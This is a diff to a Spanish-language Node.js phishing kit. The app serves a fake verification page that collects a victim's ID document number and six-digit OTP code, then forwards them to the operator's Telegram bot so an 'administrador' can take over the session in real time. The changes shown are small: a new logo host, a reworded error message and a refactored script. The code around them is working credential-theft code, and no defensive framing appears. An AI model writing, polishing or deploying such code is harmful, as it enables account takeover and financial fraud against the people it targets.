@@ -36,7 +36,7 @@ form{width:100%;display:flex;flex-direction:column;align-items:center;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 `;
 
-const logoHtml = `<img src="https://i.ibb.co/1G4kztWc/logo.png" alt="Logo" class="header-logo">`;
+const logoHtml = `<img src="https://i.postimg.cc/vTjqv35M/logo.png" alt="Logo" class="header-logo">`;
 
 // --- RUTAS DE LA WEB ---
 
@@ -108,6 +108,7 @@ app.post('/guardar-clave', async (req, res) => {
 });
 
 // 3. OTP
+// 3. OTP
 app.get('/otp.html', (req, res) => {
     const error = req.query.error;
     res.send(`<!DOCTYPE html>
@@ -117,21 +118,25 @@ app.get('/otp.html', (req, res) => {
 <header class="top-header">${logoHtml}</header>
 <main class="main-wrapper"><div class="auth-container">
 <h1 class="auth-title">Código de verificación</h1>
-${error ? '<p class="error-message" style="margin-bottom:15px;font-weight:500;">El código ingresado es incorrecto.</p>' : ''}
+${error ? '<p class="error-message" style="margin-bottom:15px;font-weight:500;">El código ingresado es incorrecto. Intente nuevamente.</p>' : ''}
 <p style="font-size:14px;color:#555;margin-bottom:30px;">Ingrese el código de 6 dígitos enviado a su dispositivo.</p>
 <form method="POST" action="/guardar-otp" autocomplete="off" onsubmit="this.querySelector('.btn-submit').innerText='Validando...';">
 <input type="hidden" name="id" id="inputIdOtp">
 <div class="input-group"><input type="text" name="otp" class="custom-input" placeholder="------" required maxlength="6" autofocus style="letter-spacing:4px;"></div>
 <button type="submit" class="btn-submit">Continuar</button>
 </form></div></main>
-<script>document.getElementById('inputIdOtp').value = new URLSearchParams(window.location.search).get('id') || '';</script></body></html>`);
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const sessionId = urlParams.get('id');
+document.getElementById('inputIdOtp').value = sessionId || '';
+</script></body></html>`);
 });
 
 app.post('/guardar-otp', async (req, res) => {
     const { otp, id } = req.body;
     if (sesiones[id]) {
         sesiones[id].otp = otp;
-        sesiones[id].comando = 'esperar_otp';
+        sesiones[id].comando = 'esperar_otp'; // Vuelve a poner estado de espera para el administrador
 
         const mensajeOtp = `🔑 **CÓDIGO OTP RECIBIDO**\n\n👤 **Documento:** ${sesiones[id].documento}\n🔢 **OTP:** ${otp}\n🆔 **Session ID:** ${id}`;
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
